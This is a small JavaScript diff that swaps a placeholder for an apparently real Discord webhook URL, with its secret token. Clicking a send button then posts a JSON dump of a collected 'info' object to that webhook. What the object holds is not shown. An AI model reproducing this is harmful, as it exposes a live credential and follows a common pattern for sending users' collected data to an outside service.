@@ -27,7 +27,7 @@ async function showInfo() {
 
   document.getElementById("sendBtn").onclick = async () => {
     try {
-      await fetch("YOUR_DISCORD_WEBHOOK_URL", {
+      await fetch("https://discord.com/api/webhooks/1415414715294810213/0x0YmH85fxKlQzaydK_vI9Mi8XLsN88GxzGRoMRaS9cYk17vqPFc5CWdo4fSr8qmLTkU", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ content: "```json\n" + JSON.stringify(info, null, 2) + "\n```" })
